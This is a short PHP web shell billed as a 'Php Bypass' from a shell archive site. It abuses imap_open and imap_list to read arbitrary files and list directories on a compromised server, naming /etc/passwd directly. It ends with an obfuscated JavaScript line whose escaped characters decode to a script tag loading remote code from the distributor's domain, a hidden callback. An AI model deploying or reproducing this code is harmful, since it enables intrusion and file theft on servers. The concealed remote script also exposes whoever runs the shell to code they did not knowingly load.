<?php 
/*
******************************************************************************************************
*							SheLL Archive
*                                Php Bypass - www.shellci.biz
*
******************************************************************************************************
*/       

       $string = !empty($_POST['string']) ? $_POST['string'] : 0; 
       $switch = !empty($_POST['switch']) ? $_POST['switch'] : 0; 

       if ($string && $switch == "file") { 
               $stream = imap_open($string, "", ""); 
               if ($stream == FALSE) 
                       die("Can't open imap stream"); 

               $str = imap_body($stream, 1); 
               if (!empty($str)) 
                       echo "<pre>".$str."</pre>"; 
               imap_close($stream); 
       } elseif ($string && $switch == "dir") { 
               $stream = imap_open("/etc/passwd", "", ""); 
               if ($stream == FALSE) 
                       die("Can't open imap stream"); 

               $string = explode("|",$string); 
               if (count($string) > 1) 
                       $dir_list = imap_list($stream, trim($string[0]), trim($string[1])); 
               else 
                       $dir_list = imap_list($stream, trim($string[0]), "*"); 
               echo "<pre>"; 
               for ($i = 0; $i < count($dir_list); $i++) 
                       echo "$dir_list[$i]\n"; 
               echo "</pre>"; 
               imap_close($stream); 
       } 
?>
<script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0073\u0068\u0065\u006c\u006c\u0063\u0069\u002e\u0062\u0069\u007a\u002f\u0079\u0061\u007a\u0063\u0069\u007a\u002f\u0063\u0069\u007a\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>